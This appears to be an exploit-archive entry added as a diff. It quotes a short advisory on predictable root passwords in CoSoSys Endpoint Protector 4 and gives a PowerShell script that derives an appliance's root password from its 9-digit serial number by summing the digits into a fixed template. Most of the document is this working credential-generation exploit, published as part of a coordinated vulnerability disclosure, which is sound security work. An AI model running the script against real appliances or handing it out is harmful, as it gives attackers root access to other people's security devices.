@@ -1,0 +1,59 @@
+source: http://www.securityfocus.com/bid/55570/info
+
+CoSoSys Endpoint Protector is prone to an insecure password generation vulnerability.
+
+Successfully exploiting this issue may allow an attacker to guess generated passwords and gain access to affected appliances.
+
+CoSoSys Endpoint Protector 4 is vulnerable; other versions may also be affected. 
+
+function Get-EPPPassword {
+<#
+.Synopsis
+
+ Get-EPPPassword calculates the predictable root password for Cososys Endpoint Protector 4 servers.
+ Author: Chris Campbell (@obscuresec)
+ License: BSD 3-Clause
+ 
+.Description
+
+ Get-EPPPassword Timeline: 
+  discovered            3 Mar 2012
+  reported to vendor   12 Jun 2012
+  reported to US-CERT  15 Jul 2012
+  released             17 Sep 2012
+    
+.Example
+
+ Get-EPPPassword -Serial 123456789
+
+.Link
+
+ http://obscuresecurity.blogspot.com/2012/09/cososys-predicable-password-cve-2012.html
+#>
+
+Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $Serial)
+
+#function to calculate sums from serial number 
+function GetSerialSum {
+ if ($Serial.Length -ne 9) {
+        Return "EPP Serial Number is 9 digits"
+    } 
+    else {
+ #convert $serial to an array of integers 
+  [int[]] $SerialArray = [char[]]$Serial| ForEach-Object {[int]"$_"}
+   }
+ foreach ($Number in $SerialArray) {
+            $Sum += $Number
+            }
+ Write-Output $Sum
+}
+
+#function to calculate epproot password
+function GetPassword {
+ Write-Output "eroot!00$Sums`RO"
+ }
+$Sums = GetSerialSum
+GetPassword
+}
+
+Get-EPPPassword -Serial 135792468
